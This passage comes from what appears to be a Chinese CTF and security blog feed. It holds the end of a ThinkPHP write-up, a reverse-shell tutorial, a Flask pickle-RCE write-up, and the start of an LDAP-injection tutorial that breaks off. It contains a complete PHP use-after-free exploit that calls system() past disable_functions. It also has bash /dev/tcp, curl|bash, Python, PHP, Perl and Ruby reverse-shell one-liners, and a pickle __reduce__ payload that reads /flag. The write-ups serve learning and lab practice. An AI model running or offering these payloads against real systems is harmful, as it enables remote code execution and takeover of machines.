class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = unserialize(<span class="variable">$poc</span>);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把上面的exp通过蚁剑上传</p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106233958835.png" alt="image-20220106233958835"></p><p>最后在search界面传递一个key=<code>&lt;?php include(&#39;/var/www/html/runtime/session/exp.php&#39;)?&gt;</code>并访问session文件，即可得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; thinkphp-v6.0.0框架漏洞+disable_functions绕过&lt;/p&gt;
&lt;p&gt;打开题目是一个简易网站，目录扫描发现在 &lt;code&gt;www.zip&lt;/code&gt; 有源码泄露，下载下来&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/01/06/GYCTF202</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/06/test/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/06/test/</id>
    <published>2022-01-06T06:55:00.000Z</published>
    <updated>2022-01-06T08:08:15.817Z</updated>
    
    <content type="html"><![CDATA[<p>博客迁移测试</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;博客迁移测试&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>反弹shell简单入门</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/03/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/03/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-01-03T07:10:13.000Z</published>
    <updated>2022-01-06T05:20:09.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h1><p>反弹shell(reverse shell)，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。通常用于被控端因<strong>防火墙受限、权限不足、端口被占用</strong>等情形。</p><h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>linux文件描述符可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p><p>当Linux启动时会默认打开三种文件描述符，分别是：</p><ul><li>标准输入 standard input 0（设备默认键盘）</li><li>标准输出 standard output 1（设备默认显示器）</li><li>错误输出 error output 2（设备默认显示器）</li></ul><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ol><li>输入重定向 <strong>&lt;    &lt;&lt;</strong></li><li>输出重定向 <strong>&gt;    &gt;&gt;</strong></li></ol><p>bash在执行命令时，会先按照从左至右的顺序解析重定向符，然后再把重定向符去掉执行指令</p><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">command &gt; file</td><td align="left">将输出重定向到 file。</td></tr><tr><td align="left">command &lt; file</td><td align="left">将输入重定向到 file。</td></tr><tr><td align="left">command &gt;&gt; file</td><td align="left">将输出以追加的方式重定向到 file。</td></tr><tr><td align="left">n &gt; file</td><td align="left">将文件描述符为 n 的文件重定向到 file。</td></tr><tr><td align="left">n &gt;&gt; file</td><td align="left">将文件描述符为 n 的文件以追加的方式重定向到 file。</td></tr><tr><td align="left">n &gt;&amp; m</td><td align="left">将输出文件 m 和 n 合并。</td></tr><tr><td align="left">n &lt;&amp; m</td><td align="left">将输入文件 m 和 n 合并。</td></tr><tr><td align="left">&lt;&lt; tag</td><td align="left">将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td></tr></tbody></table><h1 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&lt;&amp;1</span><br></pre></td></tr></table></figure><ol><li>bash -i： 打开一个交互的bash</li><li>&amp;： 将标准错误输出重定向到标准输出</li><li>/dev/tcp/ip/port：这个文件实际上不存在，但在<strong>Linux下一切皆文件</strong>，可以将其看作一个设备，如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</li><li>0&gt;&amp;1：将标准输入重定向到标准输出上，因为标准输出已经重定向到了攻击机上，所以标准输入也就重定向到了攻击机上</li></ol><h1 id="curl-bash反弹shell"><a href="#curl-bash反弹shell" class="headerlink" title="curl+bash反弹shell"></a>curl+bash反弹shell</h1><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容为<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p><p>然后开启端口监听，并在目标机上执行命令<code>curl ip|bash</code></p><h1 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹shell</h1><p>Python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>PHP:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>Perl:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><p>Ruby:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;含义&quot;&gt;&lt;a href=&quot;#含义&quot; class=&quot;headerlink&quot; title=&quot;含义&quot;&gt;&lt;/a&gt;含义&lt;/h1&gt;&lt;p&gt;反弹shell(reverse shell)，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HFCTF2021-easyflask-writeup</title>
    <link href="https://wuyusanhua2021.github.io/2021/12/20/HFCTF2021-easyflask-writeup/"/>
    <id>https://wuyusanhua2021.github.io/2021/12/20/HFCTF2021-easyflask-writeup/</id>
    <published>2021-12-20T05:58:27.000Z</published>
    <updated>2022-01-06T05:20:10.756Z</updated>
    
    <content type="html"><![CDATA[<p>按照提示跳转到<code>file?file=/app/source</code>，得源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>审计得到信息：</p><p>1）<code>SECRET_KEY</code>具体值未知</p><p>2）file_handler()会过滤访问请求，请求合法则返回文件内容，且输入的路径会被拼接到<code>static</code>后面，此处有一个小知识：当 <code>os.path.join()</code>的第二个参数为绝对路径时拼接的结果就是该绝对路径</p><p>3）/admin路由下会提取u，若u在字典中，则提取u中的b并对其进行base64解码，赋值给u，再对u反序列化</p><p>具体思路就是伪造session执行pickle反序列化RCE</p><p>flask的session伪造必须要密钥<code>SECRET_KEY</code>，密钥一般通过环境变量传递给程序或者写在配置文件里面</p><blockquote><p>通常情况下获取 <code>secret_key</code> 的方法有以下几种：</p><ul><li>网站某处泄露获取</li><li>通过 SSTI 漏洞获取，如 <code>/&#123;&#123;config&#125;&#125;</code></li><li>通过 SSRF 读取存在 <code>secret_key</code> 的 Flask 配置文件或读取 /proc/self/environ 获取</li><li>爆破</li></ul></blockquote><p>本题可以在环境变量<code>/proc/self/environ</code>中找到</p><p><img src="/2021/12/20/HFCTF2021-easyflask-writeup/image-20211220142529168.png" alt="image-20211220142529168"></p><p>下面是序列化的base64加密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag ` &gt; /hack&#x27;).read()&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br></pre></td></tr></table></figure><p>在linux里面执行脚本，并通过<code>flask_session_cookie_manager</code>来伪造session</p><p><img src="/2021/12/20/HFCTF2021-easyflask-writeup/image-20211226153923334.png" alt="image-20211226153923334"></p><p>把原来的session替换掉，再进入<code>file?file=/hack</code>即可得到flag</p><p>参考资料：</p><p><a href="https://tyskill.github.io/posts/hfctf2021final/#easyflask">[BUUOJ]HFCTF 2021 Final复现</a></p><p><a href="https://www.freebuf.com/articles/web/252189.html">Python Pickle反序列化漏洞</a></p><p><a href="https://www.cnblogs.com/liushui-sky/p/9354536.html">linux伪文件系统/proc详解</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;按照提示跳转到&lt;code&gt;file?file=/app/source&lt;/code&gt;，得源码&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>LDAP注入学习</title>
    <link href="https://wuyusanhua2021.github.io/2021/12/12/LDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wuyusanhua2021.github.io/2021/12/12/LDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-12-12T08:50:39.000Z</published>
    <updated>2022-01-06T05:20:09.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LDAP简介"><a href="#LDAP简介" class="headerlink" title="LDAP简介"></a>LDAP简介</h1><h2 id="什么是LDAP"><a href="#什么是LDAP" class="headerlink" title="什么是LDAP"></a>什么是LDAP</h2><p>LDAP是指轻量级目录访问协议，以信息目录的形式存在。</p><p>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</p><p>目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。</p><p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。</p><h2 id="LDAP基本结构"><a href="#LDAP基本结构" class="headerlink" title="LDAP基本结构"></a>LDAP基本结构</h2><h3 id="目录树概念"><a href="#目录树概念" class="headerlink" title="目录树概念"></a>目录树概念</h3><ul><li>目录树：在一个目录信息服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目</li><li>条目：每个条目就是一条记录，每个条目都有自己的唯一可区别的名称（dn）</li><li>对象类：与某个实体类型对应的一组属性，可以继承</li><li>属性：描述条目某一方面的信息，一个属性由一个属性类型和一个或多个属性值组成，分为必须和非必须属性</li></ul><h3 id="LDAP目录结构"><a href="#LDAP目录结构" class="headerlink" title="LDAP目录结构"></a>LDAP目录结构</h3><ul><li>dc：域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc=example,dc=com（一条记录的所属位置）</li><li>ou：组织单位，组织单位可以包含其它各种对象（包括其它组织单元）如ou=admin（一条记录所属组织）</li><li>cn：公共名称，如“scott”（一条记录的名称）</li><li>dn：”cn=baby,ou=marketing,ou=people,dc=myadmin,dc=org“，一条记录的位置（唯一）</li></ul><p><img src="/2021/12/12/LDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/20200721143738.png" alt="img"></p><h2 id="LDAP基本语法"><a href="#LDAP基本语法" class="headerlink" title="LDAP基本语法"></a>LDAP基本语法</h2><p>一个完整的ldap查询语句包含一个或多个搜索过滤器，搜索过滤器的格式为</p><p><code>&lt;attribute&gt;&lt;operator&gt;&lt;value&gt;</code>，如<code>(cn=wuyusanhua)</code></p><p>通过逻辑运算符可以将多个搜索过滤器整合为单个搜索过滤器</p><p>如<code>(|(cn=wuyusanhua)(cn=Unicorn))</code></p><p>LDAP中常用到以下运算符：</p><ol><li>()（括号）：规定一个搜索过滤器的开始与结束</li><li>=（等于）：如<code>(givenName=zhangsan)</code>，查找所包含的属性值与指定值相同的项</li><li>&amp;（逻辑与）：如<code>(&amp;(address=Beijing)(givenName=zhangsan))</code>，查找与<strong>所有</strong>搜索过滤器中指定的条件相匹配的项</li><li>|（逻辑或）：如<code>(|(givenName=zhangsan)(givenName=lisi))</code>，查找与<strong>至少一个</strong>搜索过滤器中指定的条件相匹配的项</li><li>!（逻辑非）：如<code>(!name=zhangsan)</code>，查找与任何搜索过滤器中指定的条件都不匹配的项</li><li>*（通配符）：可使用通配符表示值可以等于任何值，可用于<strong>知晓目标值的一部分</strong>的情况下的查找，如：<code>(givenName=zhang*), (givenName=*ang*)</code></li><li>特殊常量：（&amp;）=&gt; Absolute True； (|) =&gt;Absolute False</li></ol><h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>与sql注入的成因相似，都是没有对用户的输入进行合适的过滤，导致了恶意代码嵌入到正常的查询语句中。</p><p>常用的LDAP为ADAM和OpenLDAP，ADAM不允许有两个过滤器的查询，OpenLDAP只会执行第一个过滤器，因此被用于构造恶意代码的查询语句通常都包含逻辑运算符</p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><p>如<code>(&amp;(attribute=value)(sec_filter))  